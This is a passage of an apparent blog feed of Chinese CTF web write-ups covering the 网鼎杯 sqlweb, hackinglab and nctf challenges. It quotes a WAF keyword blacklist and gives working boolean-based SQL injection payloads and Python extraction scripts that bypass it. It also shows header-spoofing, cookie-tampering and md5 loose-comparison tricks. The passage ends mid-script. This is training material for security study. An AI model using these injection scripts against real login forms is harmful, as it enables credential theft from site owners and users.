class="line">    asc = match.group(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span> asc == <span class="string">'0'</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    flag = flag + chr(int(asc))</span><br><span class="line">print(<span class="string">'flag:'</span>,flag)</span><br></pre></td></tr></table></figure><p>这里实际测试获取表名，发现information被过滤了，flag表只能猜测得到</p><p>最后执行结果</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/网鼎杯第二场Web/7.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h3 id="sqlweb"><a href="#sqlweb" class="headerlink" title="sqlweb"></a>sqlweb</h3><p>题目首先给出了提示”admin拿不到flag”，题目是一个登陆页面，猜测存在sql注入</p><p>首先我们应该是要用admin来登录，先寻找注入点</p><p>抓包测试，服务器先检测输入的用户名是否存在，再检查密码是否正确</p><p>我们输入uname=admin&amp;passwd=1&amp;submit=login,提示password error</p><p>输入uname=admin’#&amp;passwd=1&amp;submit=login,提示password error</p><p>说明注入点可能在uname，被单引号包裹，那么我们可以根据提示password error 或者username error进行基于布尔的注入</p><p>输入uname=admin’ and 1=1#&amp;passwd=1&amp;submit=login,提示password error</p><p>提示waf:/sleep|benchmark|=|like|regexp|and||%|substr|union|\s+|group|floor|user|extractvalue|UpdateXml|ord|lpad|rpad|left|&gt;|,|ascii/i  !!! (trust me,no one can bypass it)</p><p>说明此处存在过滤关键字的waf，过滤了空格，用/**/替代，过滤了逗号，过滤了and，用&amp;&amp;替代，还过滤了等号，&gt;，不等号也没办法用，这里可以用in语句来进行布尔注入的判断</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/网鼎杯第二场Web/8.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>过滤了substr,还有mid可以用，过滤了逗号，那么可以用mid( from 1 for 1)</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/网鼎杯第二场Web/9.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>那么我们可以构造payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&apos;/**/&amp;&amp;/**/mid((select/**/database())/**/from/**/1/**/for/**/1)/**/in(&apos;t&apos;)#&amp;passwd=1&amp;submit=login</span><br></pre></td></tr></table></figure><p>根据返回的username error或者password error判断，如果返回password error，说明判断语句正确，返回username error说明判断语句错误</p><p>这里发现响应头部字段存在提示</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hint: &lt;!--create table users ...id username passwd  --&gt;</span><br></pre></td></tr></table></figure><p>告诉了我们表的结构</p><p>猜测flag在passwd，那么我们就注出passwd列下的数据，payload如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&apos;/**/&amp;&amp;/**/mid((select/**/passwd/**/from/**/users)/**/from/**/1/**/for/**/1)/**/in(&apos;t&apos;)#&amp;passwd=1&amp;submit=login</span><br></pre></td></tr></table></figure><p>但是发现这里还过滤了user，那么就去掉users</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&apos;/**/&amp;&amp;/**/mid(passwd/**/from/**/1/**/for/**/1)/**/in(&apos;t&apos;)#&amp;passwd=1&amp;submit=login</span><br></pre></td></tr></table></figure><p>为什么可以这样呢，经过测试发现如果sql语句的前面已经指定了表和用户名，那么passwd直接返回的是该表下用户名对应的密码，如下图所示</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/网鼎杯第二场Web/10.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>接下来就是写个脚本注入了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://8d1802ff177a4d569dafef8aac590cbde77f688da3624512.game.ichunqiu.com/sql.php"</span></span><br><span class="line">all_string = <span class="string">"&#123;&#125;-1234567890qwertyuiopasdfghjklzxcvbnm"</span></span><br><span class="line">passwd = <span class="string">""</span></span><br><span class="line">f = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> all_string:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">'uname'</span>:<span class="string">"admin'/**/&amp;&amp;/**/mid(passwd/**/from/**/%d/**/for/**/1)/**/in('%s')#"</span>%(i,j),</span><br><span class="line">            <span class="string">'passwd'</span>:<span class="string">'1'</span>,</span><br><span class="line">            <span class="string">'submit'</span>:<span class="string">'login'</span></span><br><span class="line">            &#125;</span><br><span class="line">        r = requests.post(url,data=data)</span><br><span class="line">        <span class="keyword">if</span> len(r.text) == <span class="number">75</span>:</span><br><span class="line">            passwd = passwd + j</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">elif</span> len(r.text) == <span class="number">77</span> <span class="keyword">and</span> j == <span class="string">'m'</span>:</span><br><span class="line">            f = <span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> f == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">print(<span class="string">'passwd:'</span>,passwd)</span><br></pre></td></tr></table></figure><p>运行结果passwd: admin123</p><p>登录admin用户，提示只有wuyanzu用户才能拿到flag</p><p>那么我们再爆wuyanzu的密码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://8d1802ff177a4d569dafef8aac590cbde77f688da3624512.game.ichunqiu.com/sql.php"</span></span><br><span class="line">all_string = <span class="string">"&#123;&#125;-1234567890qwertyuiopasdfghjklzxcvbnm"</span></span><br><span class="line">passwd = <span class="string">""</span></span><br><span class="line">f = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> all_string:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">'uname'</span>:<span class="string">"wuyanzu'/**/&amp;&amp;/**/mid(passwd/**/from/**/%d/**/for/**/1)/**/in('%s')#"</span>%(i,j),</span><br><span class="line">            <span class="string">'passwd'</span>:<span class="string">'1'</span>,</span><br><span class="line">            <span class="string">'submit'</span>:<span class="string">'login'</span></span><br><span class="line">            &#125;</span><br><span class="line">        r = requests.post(url,data=data)</span><br><span class="line">        <span class="keyword">if</span> len(r.text) == <span class="number">75</span>:</span><br><span class="line">            passwd = passwd + j</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">elif</span> len(r.text) == <span class="number">77</span> <span class="keyword">and</span> j == <span class="string">'m'</span>:</span><br><span class="line">            f = <span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> f == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">print(<span class="string">'passwd:'</span>,passwd)</span><br></pre></td></tr></table></figure><p>执行结果passwd: flag{de822b90-2edf-404c-aaeb-8e797768d9ea}</p><p>拿到flag</p>]]></content>
    
    <summary type="html">
    
      ctf-Web
    
    </summary>
    
      <category term="ctf-Web" scheme="https://Foxgrin.github.io/categories/ctf-Web/"/>
    
    
      <category term="ctf" scheme="https://Foxgrin.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>hackinglab-Web</title>
    <link href="https://Foxgrin.github.io//posts/44938/"/>
    <id>https://Foxgrin.github.io//posts/44938/</id>
    <published>2018-08-20T03:16:00.000Z</published>
    <updated>2018-09-04T13:22:50.071Z</updated>
    
    <content type="html"><![CDATA[<p>hackinglab平台Web题解<a id="more"></a></p><h2 id="基础关"><a href="#基础关" class="headerlink" title="基础关"></a>基础关</h2><h3 id="第一题"><a href="#第一题" class="headerlink" title="第一题"></a>第一题</h3><p>网址：<a href="http://lab1.xseclab.com/base1_4a4d993ed7bd7d467b27af52d2aaa800/index.php" target="_blank" rel="noopener">http://lab1.xseclab.com/base1_4a4d993ed7bd7d467b27af52d2aaa800/index.php</a></p><p>源代码找到flag</p><h3 id="第二题"><a href="#第二题" class="headerlink" title="第二题"></a>第二题</h3><p>给了密文xrlvf23xfqwsxsqf ，需要我们再加密一次，经过查询这是rot13编码，再加密一次得到keyis23ksdjfkfds</p><h3 id="第三题"><a href="#第三题" class="headerlink" title="第三题"></a>第三题</h3><p>给出了base64加密的密文，需要我们不断解密，写个脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">password = <span class="string">""</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">password = base64.b64decode(password)</span><br><span class="line">i += <span class="number">1</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"The Number of encryptions is:"</span>,str(i)</span><br><span class="line"><span class="keyword">print</span> password</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/hackinglab/1.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h3 id="第四题"><a href="#第四题" class="headerlink" title="第四题"></a>第四题</h3><p>给出了md5加密的密文，直接扔到<a href="https://cmd5.org/解密得bighp" target="_blank" rel="noopener">https://cmd5.org/解密得bighp</a>  </p><h3 id="第五题"><a href="#第五题" class="headerlink" title="第五题"></a>第五题</h3><p>网址：<a href="http://lab1.xseclab.com/base1_0ef337f3afbe42d5619d7a36c19c20ab/index.php" target="_blank" rel="noopener">http://lab1.xseclab.com/base1_0ef337f3afbe42d5619d7a36c19c20ab/index.php</a></p><p>题目说只让外国人访问，用burp抓包看到头部看到Accept-Language: zh-CN,zh;q=0.9字段</p><p>尝试将zh-CN,zh;删除，得到key</p><h3 id="第六题"><a href="#第六题" class="headerlink" title="第六题"></a>第六题</h3><p>网址：<a href="http://lab1.xseclab.com/base6_6082c908819e105c378eb93b6631c4d3/index.php" target="_blank" rel="noopener">http://lab1.xseclab.com/base6_6082c908819e105c378eb93b6631c4d3/index.php</a></p><p>只有HAHA浏览器才能访问页面，浏览器相关信息在User-Agent字段中体现，利用burp抓包在User-Agent字段添加HAHA即可得到key</p><h3 id="第七题"><a href="#第七题" class="headerlink" title="第七题"></a>第七题</h3><p>网址：<a href="http://lab1.xseclab.com/base7_eb68bd2f0d762faf70c89799b3c1cc52/index.php" target="_blank" rel="noopener">http://lab1.xseclab.com/base7_eb68bd2f0d762faf70c89799b3c1cc52/index.php</a></p><p>key在响应头部字段中</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/hackinglab/2.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h3 id="第八题"><a href="#第八题" class="headerlink" title="第八题"></a>第八题</h3><p>网址：<a href="http://lab1.xseclab.com/base8_0abd63aa54bef0464289d6a42465f354/index.php" target="_blank" rel="noopener">http://lab1.xseclab.com/base8_0abd63aa54bef0464289d6a42465f354/index.php</a></p><p>源代码显示访问<a href="http://lab1.xseclab.com/base8_0abd63aa54bef0464289d6a42465f354/search_key.php，可是却跳转到http://hacklist.sinaapp.com/base8_0abd63aa54bef0464289d6a42465f354/index_no_key.php" target="_blank" rel="noopener">http://lab1.xseclab.com/base8_0abd63aa54bef0464289d6a42465f354/search_key.php，可是却跳转到http://hacklist.sinaapp.com/base8_0abd63aa54bef0464289d6a42465f354/index_no_key.php</a></p><p>明显有重定向</p><p>用burp抓包查看<a href="http://lab1.xseclab.com/base8_0abd63aa54bef0464289d6a42465f354/search_key.php返回信息" target="_blank" rel="noopener">http://lab1.xseclab.com/base8_0abd63aa54bef0464289d6a42465f354/search_key.php返回信息</a></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/hackinglab/3.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>访问<a href="http://hacklist.sinaapp.com/base8_0abd63aa54bef0464289d6a42465f354/key_is_here_now_.php" target="_blank" rel="noopener">http://hacklist.sinaapp.com/base8_0abd63aa54bef0464289d6a42465f354/key_is_here_now_.php</a></p><p>key: ohHTTP302dd </p><h3 id="第九题"><a href="#第九题" class="headerlink" title="第九题"></a>第九题</h3><p>网址：<a href="http://lab1.xseclab.com/base9_ab629d778e3a29540dfd60f2e548a5eb/index.php" target="_blank" rel="noopener">http://lab1.xseclab.com/base9_ab629d778e3a29540dfd60f2e548a5eb/index.php</a></p><p>burp抓包将Cookie: Login=0修改成Cookie: Login=1</p><p>key is: yescookieedit7823789KJ</p><h3 id="第十题"><a href="#第十题" class="headerlink" title="第十题"></a>第十题</h3><p>网址：<a href="http://lab1.xseclab.com/base10_0b4e4866096913ac9c3a2272dde27215/index.php" target="_blank" rel="noopener">http://lab1.xseclab.com/base10_0b4e4866096913ac9c3a2272dde27215/index.php</a></p><p>在控制台中修改input标签的max-length属性值，修改为1000，然后随便post四位数字以上即可</p><p>key is 768HKyu678567&amp;*&amp;K </p><h3 id="第十一题"><a href="#第十一题" class="headerlink" title="第十一题"></a>第十一题</h3><p>网址：<a href="http://lab1.xseclab.com/base11_0f8e35973f552d69a02047694c27a8c9/index.php" target="_blank" rel="noopener">http://lab1.xseclab.com/base11_0f8e35973f552d69a02047694c27a8c9/index.php</a></p><p>要求本地访问，用burp抓包添加X-Forwarded-For:127.0.0.1</p><p>这里服务器出问题了，直接给出了源代码和key is ^&amp;*(UIHKJjkadshf </p><h3 id="第十二题"><a href="#第十二题" class="headerlink" title="第十二题"></a>第十二题</h3><p>网址：<a href="http://lab1.xseclab.com/base12_44f0d8a96eed21afdc4823a0bf1a316b/index.php" target="_blank" rel="noopener">http://lab1.xseclab.com/base12_44f0d8a96eed21afdc4823a0bf1a316b/index.php</a></p><p>尝试了admin.php,login.php等都返回404，试着访问robots.txt，发现文件/9fb97531fe95594603aff7e794ab2f5f/</p><p>访问，提示you find me,but I am not the login page. keep search. </p><p>尝试<a href="http://lab1.xseclab.com/base12_44f0d8a96eed21afdc4823a0bf1a316b/9fb97531fe95594603aff7e794ab2f5f/login.php" target="_blank" rel="noopener">http://lab1.xseclab.com/base12_44f0d8a96eed21afdc4823a0bf1a316b/9fb97531fe95594603aff7e794ab2f5f/login.php</a></p><p>获得key is UIJ%%IOOqweqwsdf </p><h2 id="脚本关"><a href="#脚本关" class="headerlink" title="脚本关"></a>脚本关</h2><h3 id="第一题-1"><a href="#第一题-1" class="headerlink" title="第一题"></a>第一题</h3><p>网址：<a href="http://lab1.xseclab.com/xss1_30ac8668cd453e7e387c76b132b140bb/index.php" target="_blank" rel="noopener">http://lab1.xseclab.com/xss1_30ac8668cd453e7e387c76b132b140bb/index.php</a></p><p>重定向，burp抓包即可得key is : yougotit_script_now</p><h3 id="第二题-1"><a href="#第二题-1" class="headerlink" title="第二题"></a>第二题</h3><p>网址：<a href="http://lab1.xseclab.com/xss2_0d557e6d2a4ac08b749b61473a075be1/index.php" target="_blank" rel="noopener">http://lab1.xseclab.com/xss2_0d557e6d2a4ac08b749b61473a075be1/index.php</a></p><p>要求我们2秒内计算出值，不然再刷新页面就换成别的算式</p><p>写个脚本计算即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    url = <span class="string">"http://lab1.xseclab.com/xss2_0d557e6d2a4ac08b749b61473a075be1/index.php"</span></span><br><span class="line">    s = requests.Session()</span><br><span class="line">    r = s.get(url)</span><br><span class="line">    match = re.search(<span class="string">r'\s(.*)=&lt;input'</span>,r.text)</span><br><span class="line">    result = eval(match.group(<span class="number">1</span>))</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">'v'</span>:result,</span><br><span class="line">        <span class="string">'submit'</span>:<span class="string">'提交'</span></span><br><span class="line">        &#125;</span><br><span class="line">    r = s.post(url,data=data)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'key'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        print(r.text)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/hackinglab/4.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h3 id="第三题-1"><a href="#第三题-1" class="headerlink" title="第三题"></a>第三题</h3><p>输入null即可</p><h3 id="第四题-1"><a href="#第四题-1" class="headerlink" title="第四题"></a>第四题</h3><p>源代码中发现js代码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> b=<span class="function"><span class="keyword">function</span>(<span class="params">p,a,c,k,e,r</span>)</span>&#123;e=<span class="function"><span class="keyword">function</span>(<span class="params">c</span>)</span>&#123;<span class="keyword">return</span>(c&lt;a?<span class="string">''</span>:e(<span class="built_in">parseInt</span>(c/a)))+((c=c%a)&gt;<span class="number">35</span>?<span class="built_in">String</span>.fromCharCode(c+<span class="number">29</span>):c.toString(<span class="number">36</span>))&#125;;<span class="keyword">if</span>(!<span class="string">''</span>.replace(<span class="regexp">/^/</span>,<span class="built_in">String</span>))&#123;<span class="keyword">while</span>(c--)r[e(c)]=k[c]||e(c);k=[<span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;<span class="keyword">return</span> r[e]&#125;];e=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">return</span><span class="string">'\\w+'</span>&#125;;c=<span class="number">1</span>&#125;;<span class="keyword">while</span>(c--)<span class="keyword">if</span>(k[c])p=p.replace(<span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="string">'\\b'</span>+e(c)+<span class="string">'\\b'</span>,<span class="string">'g'</span>),k[c]);<span class="keyword">return</span> p&#125;(<span class="string">'1s(1e(p,a,c,k,e,r)&#123;e=1e(c)&#123;1d(c&lt;a?\'\':e(1p(c/a)))+((c=c%a)&gt;1q?1f.1j(c+1k):c.1n(1o))&#125;;1g(!\'\'.1h(/^/,1f))&#123;1i(c--)r[e(c)]=k[c]||e(c);k=[1e(e)&#123;1d r[e]&#125;];e=1e()&#123;1d\'\\\\w+\'&#125;;c=1&#125;;1i(c--)1g(k[c])p=p.1h(1l 1m(\'\\\\b\'+e(c)+\'\\\\b\',\'g\'),k[c]);1d p&#125;(\'Y(R(p,a,c,k,e,r)&#123;e=R(c)&#123;S(c&lt;a?\\\'\\\':e(18(c/a)))+((c=c%a)&gt;17?T.16(c+15):c.12(13))&#125;;U(!\\\'\\\'.V(/^/,T))&#123;W(c--)r[e(c)]=k[c]||e(c);k=[R(e)&#123;S r[e]&#125;];e=R()&#123;S\\\'\\\\\\\\w+\\\'&#125;;c=1&#125;;W(c--)U(k[c])p=p.V(Z 11(\\\'\\\\\\\\b\\\'+e(c)+\\\'\\\\\\\\b\\\',\\\'g\\\'),k[c]);S p&#125;(\\\'G(B(p,a,c,k,e,r)&#123;e=B(c)&#123;A c.L(a)&#125;;E(!\\\\\\\'\\\\\\\'.C(/^/,F))&#123;D(c--)r[e(c)]=k[c]||e(c);k=[B(e)&#123;A r[e]&#125;];e=B()&#123;A\\\\\\\'\\\\\\\\\\\\\\\\w+\\\\\\\'&#125;;c=1&#125;;D(c--)E(k[c])p=p.C(I J(\\\\\\\'\\\\\\\\\\\\\\\\b\\\\\\\'+e(c)+\\\\\\\'\\\\\\\\\\\\\\\\b\\\\\\\',\\\\\\\'g\\\\\\\'),k[c]);A p&#125;(\\\\\\\'t(h(p,a,c,k,e,r)&#123;e=o;n(!\\\\\\\\\\\\\\\'\\\\\\\\\\\\\\\'.m(/^/,o))&#123;l(c--)r[c]=k[c]||c;k=[h(e)&#123;f r[e]&#125;];e=h()&#123;f\\\\\\\\\\\\\\\'\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\w+\\\\\\\\\\\\\\\'&#125;;c=1&#125;;l(c--)n(k[c])p=p.m(q s(\\\\\\\\\\\\\\\'\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\b\\\\\\\\\\\\\\\'+e(c)+\\\\\\\\\\\\\\\'\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\b\\\\\\\\\\\\\\\',\\\\\\\\\\\\\\\'g\\\\\\\\\\\\\\\'),k[c]);f p&#125;(\\\\\\\\\\\\\\\'1 3="6";1 4="7";1 5="";8(1 2=0;2&lt;9;2++)&#123;5+=3+4&#125;\\\\\\\\\\\\\\\',j,j,\\\\\\\\\\\\\\\'|u|i|b|c|d|v|x|y|j\\\\\\\\\\\\\\\'.z(\\\\\\\\\\\\\\\'|\\\\\\\\\\\\\\\'),0,&#123;&#125;))\\\\\\\',H,H,\\\\\\\'|||||||||||||||A||B||M||D|C|E|F||I||J|G|N|O||P|Q|K\\\\\\\'.K(\\\\\\\'|\\\\\\\'),0,&#123;&#125;))\\\',X,X,\\\'||||||||||||||||||||||||||||||||||||S|R|V|W|U|T|Y|13|Z|11|14|12|10|19|1a|1b|1c\\\'.14(\\\'|\\\'),0,&#123;&#125;))\',1t,1u,\'|||||||||||||||||||||||||||||||||||||||||||||||||||||1e|1d|1f|1g|1h|1i|1v|1s|1l||1m|1n|1o|1r|1k|1j|1q|1p|1w|1x|1y|1z\'.1r(\'|\'),0,&#123;&#125;))'</span>,<span class="number">62</span>,<span class="number">98</span>,<span class="string">'|||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||return|function|String|if|replace|while|fromCharCode|29|new|RegExp|toString|36|parseInt|35|split|eval|62|75|53|var|slakfj|teslkjsdflk|for'</span>.split(<span class="string">'|'</span>),<span class="number">0</span>,&#123;&#125;);</span><br><span class="line"><span class="keyword">var</span> d=<span class="built_in">eval</span>(b);</span><br><span class="line">alert(<span class="string">"key is first 14 chars"</span>+d);</span><br></pre></td></tr></table></figure><p>直接扔到控制台执行后弹窗</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/hackinglab/5.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>截取key is first chars后的十四位就是key</p>]]></content>
    
    <summary type="html">
    
      hacking-Web
    
    </summary>
    
      <category term="hacking-Web" scheme="https://Foxgrin.github.io/categories/hacking-Web/"/>
    
    
      <category term="ctf" scheme="https://Foxgrin.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>nctf-Web</title>
    <link href="https://Foxgrin.github.io//posts/7108/"/>
    <id>https://Foxgrin.github.io//posts/7108/</id>
    <published>2018-08-12T02:48:00.000Z</published>
    <updated>2018-09-04T13:22:50.069Z</updated>
    
    <content type="html"><![CDATA[<p>南京邮电大学ctf平台Web题解<a id="more"></a></p><h3 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h3><p>网址：<a href="http://chinalover.sinaapp.com/web1/" target="_blank" rel="noopener">http://chinalover.sinaapp.com/web1/</a></p><p>flag在源代码中</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/nctf/1.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h3 id="md5-collision"><a href="#md5-collision" class="headerlink" title="md5 collision"></a>md5 collision</h3><p>网址：<a href="http://chinalover.sinaapp.com/web19/" target="_blank" rel="noopener">http://chinalover.sinaapp.com/web19/</a></p><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$md51 = md5(<span class="string">'QNKCDZO'</span>);</span><br><span class="line">$a = @$_GET[<span class="string">'a'</span>];</span><br><span class="line">$md52 = @md5($a);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($a))&#123;</span><br><span class="line"><span class="keyword">if</span> ($a != <span class="string">'QNKCDZO'</span> &amp;&amp; $md51 == $md52) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"nctf&#123;*****************&#125;"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"false!!!"</span>;</span><br><span class="line">&#125;&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;<span class="keyword">echo</span> <span class="string">"please input a"</span>;&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>md5值碰撞，get参数a=240610708 即可</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/nctf/2.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h3 id="签到2"><a href="#签到2" class="headerlink" title="签到2"></a>签到2</h3><p>网址：<a href="http://teamxlc.sinaapp.com/web1/02298884f0724c04293b4d8c0178615e/index.php" target="_blank" rel="noopener">http://teamxlc.sinaapp.com/web1/02298884f0724c04293b4d8c0178615e/index.php</a></p><p>提示我们输入口令zhimakaimen</p><p>但是源代码限制了输入文本的长度，在浏览器检查将长度修改即可输入完整口令</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/nctf/3.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/nctf/4.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h3 id="这题不是WEB"><a href="#这题不是WEB" class="headerlink" title="这题不是WEB"></a>这题不是WEB</h3><p>网址：<a href="http://chinalover.sinaapp.com/web2/index.html" target="_blank" rel="noopener">http://chinalover.sinaapp.com/web2/index.html</a></p><p>题目说不是web，看了源代码，抓了包，还真没找出什么，而且后缀名是html</p><p>下载下图片，用Notepad打开，发现最后藏了flag…</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/nctf/5.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h3 id="层层递进"><a href="#层层递进" class="headerlink" title="层层递进"></a>层层递进</h3><p>网址：<a href="http://chinalover.sinaapp.com/web3/" target="_blank" rel="noopener">http://chinalover.sinaapp.com/web3/</a></p><p>用检查的network项发现有个404页面：<a href="http://chinalover.sinaapp.com/web3/404.html" target="_blank" rel="noopener">http://chinalover.sinaapp.com/web3/404.html</a></p><p>进去发现源代码里给了提示</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/nctf/6.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>将jquery-后的字符一一拼凑就是flag，写个脚本快点</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> re</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s = <span class="string">'''&lt;script src="./js/jquery-n.7.2.min.js"&gt;&lt;/script&gt;&lt;script 